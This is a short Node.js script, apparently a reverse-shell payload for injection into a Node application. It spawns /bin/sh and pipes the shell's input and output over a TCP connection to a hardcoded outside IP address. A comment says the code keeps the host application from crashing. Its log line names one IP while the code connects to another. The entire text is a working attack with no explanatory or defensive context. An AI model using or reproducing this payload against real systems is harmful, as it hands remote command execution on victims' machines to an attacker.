(function(){
    var rport = process.argv[2];
    console.log("Attempting to open reverse shell to 35.188.157.133 on port", rport, "...");
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(rport, "35.238.106.192", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    process.exitCode=0;
    return /a/; // Prevents the Node.js application form crashing
})();
process.ExitCode=0;
//d
